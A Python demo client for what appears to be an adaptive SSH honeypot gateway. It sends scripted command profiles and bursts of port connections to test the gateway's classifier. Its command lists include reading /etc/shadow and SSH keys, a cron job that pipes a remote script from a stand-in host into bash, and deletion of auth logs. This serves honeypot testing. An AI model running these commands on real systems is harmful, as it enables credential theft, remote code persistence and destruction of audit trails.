"""
demo/attack_client.py

Stands in for your friend's laptop: connects through the gateway over SSH, runs
a list of commands, and prints whether it landed on the real server or the
honeypot. Also has a --burst mode that trips the classifier's rate/port-scan
signals so an IP earns a MALICIOUS verdict live instead of being hardcoded.
"""
from __future__ import annotations

import argparse
import socket
import sys
import time
from typing import List

try:
    import paramiko
except ImportError:  # pragma: no cover
    sys.exit("paramiko is required:  pip install paramiko")

RECON = ["uname -a", "whoami", "id", "cat /etc/issue"]
DISCOVERY = ["netstat -tulpn", "ps aux", "ip addr show", "cat /proc/cpuinfo"]
ESCALATE = ["sudo -l", "sudo su -", "cat /etc/shadow", "cat ~/.ssh/authorized_keys"]
PERSIST = ["echo '* * * * * curl -s http://198.51.100.9/b.sh|bash' | crontab -",
           "crontab -l", "rm -rf /var/log/auth.log /var/log/syslog", "history -c"]

PROFILES = {
    "normal": ["whoami", "uptime", "ls", "exit"],
    "recon": RECON,
    "attack": RECON + DISCOVERY,
    "full": RECON + DISCOVERY + ESCALATE + PERSIST,
}


def burst(host: str, port: int, count: int, ports: List[int]) -> None:
    """Hammer the gateway so conn_rate / port_scan signals fire."""
    print(f"  bursting {count} connections at {host} across ports {ports} ...")
    made = 0
    for i in range(count):
        p = ports[i % len(ports)]
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1.0)
                if s.connect_ex((host, p)) == 0:
                    made += 1
        except Exception:
            pass
        time.sleep(0.03)
    print(f"  {made}/{count} connections landed -- the classifier's behaviour "
          f"signals should now be firing for your IP.")


def run_session(host: str, port: int, user: str, password: str,
                commands: List[str], pause: float) -> int:
    print(f"\n  connecting to {host}:{port} as {user} ...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=password,
                       timeout=15, banner_timeout=15, auth_timeout=15,
                       look_for_keys=False, allow_agent=False)
    except paramiko.AuthenticationException:
        print("  AUTH REFUSED -- this is the REAL server (it checks credentials).")
        print("  Valid demo logins: deploy/deploy123 or admin/admin123")
        return 2
    except Exception as exc:
        print(f"  connection failed: {exc}")
        return 1

    banner = client.get_transport().remote_version
    where = ("HONEYPOT" if "6.0p1" in banner or "deb7" in banner
             else "REAL SERVER" if "8.9p1" in banner or "Ubuntu" in banner
             else "unknown")
    print(f"  connected. server banner: {banner}")
    print(f"  --> you landed on the {where}\n")

    chan = client.invoke_shell()
    time.sleep(1.2)
    if chan.recv_ready():
        chan.recv(65535)

    for cmd in commands:
        print(f"  $ {cmd}")
        chan.send(cmd + "\n")
        time.sleep(max(pause, 0.5))
        out = b""
        while chan.recv_ready():
            out += chan.recv(65535)
            time.sleep(0.15)
        text = out.decode("utf-8", "replace")
        body = "\n".join(
            ln for ln in text.splitlines()
            if ln.strip() and not ln.strip().startswith(("root@", "deploy@", "admin@"))
            and ln.strip() != cmd
        )
        for ln in body.splitlines()[:8]:
            print(f"      {ln}")
        print()

    chan.send("exit\n")
    time.sleep(0.6)
    client.close()
    print(f"  session closed. Everything above was recorded by the {where}.")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="Simulate a peer connecting through the gateway")
    ap.add_argument("host", help="the gateway's LAN IP, e.g. 192.168.0.110")
    ap.add_argument("--port", type=int, default=8080, help="gateway port (default 8080)")
    ap.add_argument("--user", default="root")
    ap.add_argument("--password", default="hunter2")
    ap.add_argument("--profile", choices=sorted(PROFILES), default="attack",
                    help="normal | recon | attack | full (default attack)")
    ap.add_argument("--pause", type=float, default=0.8, help="seconds between commands")
    ap.add_argument("--burst", type=int, default=0,
                    help="fire N rapid connections first to trip the rate/scan signals")
    ap.add_argument("--burst-ports", default="8080,22,23,80,3389")
    args = ap.parse_args()

    print("\n  " + "=" * 62)
    print("  PEER CLIENT -- connecting through the adaptive honeypot gateway")
    print("  " + "=" * 62)

    if args.burst:
        burst(args.host, args.port, args.burst,
              [int(p) for p in args.burst_ports.split(",") if p.strip()])

    rc = run_session(args.host, args.port, args.user, args.password,
                     PROFILES[args.profile], args.pause)
    print()
    return rc


if __name__ == "__main__":
    raise SystemExit(main())
